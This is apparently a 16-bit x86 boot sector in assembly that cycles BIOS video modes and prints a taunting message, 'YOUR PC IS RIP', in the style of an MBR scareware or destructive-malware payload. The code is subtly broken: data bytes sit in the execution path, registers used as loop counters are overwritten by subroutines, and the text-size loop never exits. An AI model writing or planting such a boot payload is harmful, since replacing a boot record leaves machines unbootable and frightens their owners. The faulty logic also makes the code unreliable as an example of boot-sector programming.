[BITS 16]
[ORG 0x7C00]
jmp start

start:
    xor ax, ax         ; DS = 0
    mov ds, ax
    cld                ; Clear direction flag for LODSB

    ; Video modes to cycle through (VGA modes 13h - 4h)
    video_modes db 13h, 12h, 11h, 10h, 09h, 08h, 07h, 06h, 05h, 04h
    mov si, 0          ; Mode index
    mov di, 1          ; Size change direction (1 = growing, 0 = shrinking)

mode_loop:
    ; Set video mode
    mov al, [video_modes + si]
    mov ah, 00h
    int 10h

    ; Display text with growing and shrinking effect
    call text_effect
    call short_delay

    ; Increment mode index
    inc si
    cmp si, 10         ; 10 video modes total
    jl mode_loop

    jmp $              ; Infinite loop

text_effect:
    ; Initial text size and growth/shrink direction
    mov cx, 5          ; Start size
    mov di, 1          ; Start by growing (1 = growing, 0 = shrinking)

size_loop:
    call display_text
    call short_delay

    ; Adjust size
    cmp di, 1          ; Check direction (growing or shrinking)
    jne shrinking

growing:
    add cx, 1          ; Increase size
    cmp cx, 20         ; Max size
    jle size_loop
    mov di, 0          ; Start shrinking
    jmp size_loop

shrinking:
    sub cx, 1          ; Decrease size
    cmp cx, 5          ; Min size
    jge size_loop
    mov di, 1          ; Start growing again
    jmp size_loop

display_text:
    ; Set white text color (0x0F)
    mov bl, 0x0F

    ; Text to display
    mov si, msg

print_char:
    lodsb
    cmp al, 0
    je done_print
    mov ah, 0x0E       ; BIOS teletype function
    int 10h
    jmp print_char

done_print:
    ret

short_delay:
    ; Simple delay loop
    mov cx, 0xFFFF
delay_loop:
    dec cx
    jnz delay_loop
    ret

msg db "PARANYOK NOW IN YOUR NIGHTMARES THERE IS NO ESCAPE YOUR PC IS RIP", 0

times 510 - ($-$$) db 0
dw 0xAA55